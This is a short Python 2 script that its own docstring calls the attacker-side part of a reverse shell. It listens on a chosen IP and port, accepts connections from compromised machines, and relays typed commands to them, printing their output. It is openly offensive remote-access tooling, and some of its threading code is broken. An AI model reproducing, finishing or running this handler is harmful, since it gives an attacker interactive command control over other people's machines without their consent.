#!/usr/bin/python

"""
This code executed on the attackers machine will help establish
a reverse shell. Still in production.
"""

import os
import socket
import threading
import subprocess
import pty

ip = raw_input("What is the ip: ")
port = int(raw_input("What is the port: "))

server = socket.socket()

server.bind((ip,port))
server.listen(5)


print "[*] Listening on %s:%s" % (ip,port)



def Montezuma(client):
  
    while True:
        
        
        command = raw_input(str(addr[0])+ "# ")
        client.send(command)
        response = client.recv(4096)
        if "ok" in response:
            continue
        else:
            print response
            continue

              

while True:

    client,addr = server.accept()
    print "[*] Incoming connection from %s:%d" % (addr[0],addr[1])
    

    Hernan_Cortes = threading.Thread(target=Montezuma(client))
    Hernan_Cortes.start()





































